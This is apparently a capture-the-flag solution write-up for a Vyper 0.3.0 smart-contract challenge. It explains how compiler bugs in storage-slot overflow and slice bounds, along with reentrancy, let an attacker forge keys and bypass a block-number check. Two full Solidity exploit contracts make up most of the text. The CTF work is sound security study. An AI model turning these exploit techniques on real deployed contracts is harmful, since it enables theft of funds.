# neumoxx-succession - Solution

## Find the vulnerability

Looking at the contract we immediatly notice its version 0.3.0, that is one of the version responsible for the [curve hack](https://hacken.io/discover/curve-finance-liquidity-pools-hack-explained/) in July 2023.

We also notice the `@nonreentrant("sign")` decorators so we know what we can do.

But what about this check `assert msg.sender == self.siblingAddresses[MARION] or self.siblingKeys[MARION] == self._getKey(index)`? How can we pass this?

Diving deeper we found a strange array variable `restLayout: public(bytes32[115792089237316195423570985008687907853269984665640564039457584007913129639935])` and its setter and getter functions:

```python
def setKey(index: uint256, val: bytes32):
    self.restLayout[convert(msg.sender, uint256) + index] = val

def _getKey(index: uint256) -> bytes32:
    return convert(slice(slice(self.accessor, index, 64), 32, 32), bytes32)
```

If you look at 0.3.0 vulnerabilities [here](https://security.snyk.io/package/pip/vyper/0.3.0) we found interesting ones:

- https://security.snyk.io/vuln/SNYK-PYTHON-VYPER-6124761: https://github.com/vyperlang/vyper/commit/0bb7203b584e771b23536ba065a6efda457161bb
- https://security.snyk.io/vuln/SNYK-PYTHON-VYPER-6226584: https://github.com/vyperlang/vyper/security/advisories/GHSA-9x7f-gwxq-6f2c

Thanks to first one we can save our keys on 3618502788666131106986593281521497120414687020801267626233049500247285301248 slot that is read thanks to the slice pitfall.

Now there is another check to `assert self.currentBlock <= block.number` but we can exploit this with or without reentrancy.

## Exploit the contract #1 Reentrancy

Attack with reentrancy to avoid `block.number` check.

```solidity
contract ExploiterReentrancy {
    bytes32 constant MARION_KEY = 0x000000000000000000000000000000000000000000000000000000000000bbbb;
    bytes32 constant ANNA_KEY = 0x000000000000000000000000000000000000000000000000000000000000aaaa;
    uint256 immutable keyIndex;
    bool marion;
    bool anna;

    ISuccessionCTFVy successionCTF;

    constructor(address _successionCTF) {
        successionCTF = ISuccessionCTFVy(_successionCTF);
        keyIndex = 3618502788666131106986593281521497120414687020801267626233049500247285301248 - 11
            - uint256(uint160(address(this)));
    }

    function attack() external {
        // init CTF
        successionCTF.initCTF();

        // sign for HenryJunior
        successionCTF.signHenryJunior(address(this), 0);
    }

    fallback() external payable {
        if (!marion) {
            // sign for Marion
            marion = true;
            successionCTF.setKey(keyIndex, MARION_KEY);
            successionCTF.signMarion(address(this), type(uint256).max - 63);
        } else if (!anna) {
            // sign for Anna
            anna = true;
            successionCTF.setKey(keyIndex, ANNA_KEY);
            successionCTF.signAnna(address(this), type(uint256).max - 63);
        }
    }
}
```

```solidity
ExploiterReentrancy exploiter = new ExploiterReentrancy(address(successionCTF));
exploiter.attack();
```

## Exploit the contract #2 No reentrancy

Use the same trick to change the `self.currentBlock` and pass the check.

```solidity
contract ExploiterNoReentrancy {
    bytes32 constant MARION_KEY = 0x000000000000000000000000000000000000000000000000000000000000bbbb;
    bytes32 constant ANNA_KEY = 0x000000000000000000000000000000000000000000000000000000000000aaaa;
    uint256 immutable keyIndex;
    uint256 immutable blockIndex;

    ISuccessionCTFVy successionCTF;

    constructor(address _successionCTF) {
        successionCTF = ISuccessionCTFVy(_successionCTF);
        keyIndex = 3618502788666131106986593281521497120414687020801267626233049500247285301248 - 11
            - uint256(uint160(address(this)));
        blockIndex = type(uint256).max - 1 - uint256(uint160(address(this)));
    }

    function attack() external {
        // init CTF
        successionCTF.initCTF();

        // sign for HenryJunior
        successionCTF.signHenryJunior(address(this), 0);

        // sign for Marion
        successionCTF.setKey(keyIndex, MARION_KEY);
        successionCTF.setKey(blockIndex, bytes32(0));
        successionCTF.signMarion(address(this), type(uint256).max - 63);

        // sign for Anna
        successionCTF.setKey(keyIndex, ANNA_KEY);
        successionCTF.setKey(blockIndex, bytes32(0));
        successionCTF.signAnna(address(this), type(uint256).max - 63);
    }

    fallback() external payable {}
}
```

```solidity
ExploiterNoReentrancy exploiter = new ExploiterNoReentrancy(address(successionCTF));
exploiter.attack();
```
